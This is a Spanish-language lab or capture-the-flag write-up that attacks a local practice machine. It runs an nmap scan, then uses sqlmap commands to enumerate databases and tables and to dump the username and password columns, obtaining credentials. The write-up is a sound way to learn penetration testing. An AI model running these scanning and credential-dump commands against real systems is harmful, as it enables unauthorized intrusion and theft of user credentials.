VM Injection

Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando en NMAP:

```
sudo nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 172.17.0.2
```

Resultado:

```
❯ sudo nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 172.17.0.2
[sudo] contraseña para pablo17: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 12:15 CST
Initiating ARP Ping Scan at 12:15
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:15, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:15
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:15, 0.61s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-06-01 12:15:40 CST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Ahora vamos a utilizar sqlmap para escanear vulnerabilidades SQL:

```
sqlmap -u http://172.17.0.2/ --dbs --batch --forms
```

Resultado:

```
[14:17:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:18:00] [INFO] fetching database names
[14:18:00] [INFO] retrieved: 'information_schema'
[14:18:00] [INFO] retrieved: 'register'
[14:18:00] [INFO] retrieved: 'sys'
[14:18:00] [INFO] retrieved: 'performance_schema'
[14:18:00] [INFO] retrieved: 'mysql'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys
```

Vemos que encontró 5 bases de datos, la que nos interesa es register entonces vamos a realizar un escáner a esa dB:

```
sqlmap -u http://172.17.0.2/ -D register --tables --batch --forms
```

Resultado:

<img width="516" height="195" alt="Pasted image 20250602142640" src="https://github.com/user-attachments/assets/4c84974c-8190-4da9-a5d2-3a80d2bb6a4c" />

Encontramos la tabal: **users**
Ahora vamos a buscar columnas de la siguiente manera:

```
sqlmap -u http://172.17.0.2/ -D register -T users --columns --batch --forms
```

Resultado:

<img width="670" height="312" alt="Pasted image 20250602143439" src="https://github.com/user-attachments/assets/64d4cc31-2055-4499-b4b7-b9f4899f45c6" />


Encontramos 2 columnas, ahora nuestro siguiente objetivo es dumpear toda la información obtenida con `-dump`:

```
sqlmap -u http://172.17.0.2/ -D register -T users -C username,passwd --dump --batch --forms
```

<img width="1049" height="391" alt="Pasted image 20250602152820" src="https://github.com/user-attachments/assets/7a4a91bb-4a35-4ba9-972c-df2a2d56d0c9" />

Obtenemos credenciales.


